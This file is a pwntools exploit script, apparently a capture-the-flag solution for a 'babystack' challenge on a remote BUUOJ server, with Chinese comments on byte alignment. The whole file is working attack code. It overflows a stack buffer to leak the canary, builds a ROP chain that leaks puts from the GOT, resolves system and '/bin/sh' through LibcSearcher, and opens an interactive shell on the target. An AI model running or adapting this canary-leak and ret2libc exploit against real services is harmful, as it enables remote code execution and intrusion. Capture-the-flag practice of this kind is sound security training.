from pwn import*
from LibcSearcher import*
elf=ELF('./babystack')
p=remote('node4.buuoj.cn',26304)
#p=process('./babystack')
context.log_level='debug'

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
start=0x400720
pop_rdi=0x400a93

p.sendlineafter(b'>> ',b'1')
payload1=b'a'*0x88
p.sendline(payload1)
p.sendlineafter(b'>> ',b'2')
p.recvuntil(b'a\n')
canary=u64(p.recv(7).rjust(8,b'\x00'))#右对齐,经过u64后 结尾补充\x00
print(hex(canary))


payload2=b'a'*0x88+p64(canary)+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)
p.sendlineafter(b">>",b'1')
p.sendline(payload2)
p.sendlineafter(b">>",b'3')
p.recv()
puts_addr=u64(p.recv(6).ljust(8,b'\x00'))#左对齐 ，经过u64后 开头补充\x00 而直接省略
print(hex(puts_addr))

libc=LibcSearcher('puts',puts_addr)
libcbase=puts_addr-libc.dump('puts')
sys_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')
p.sendlineafter(b">>",b'1')
payload3=b'a'*0x88+p64(canary)+p64(0)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
p.sendline(payload3)
p.sendlineafter(b">>",b'3')

p.interactive()

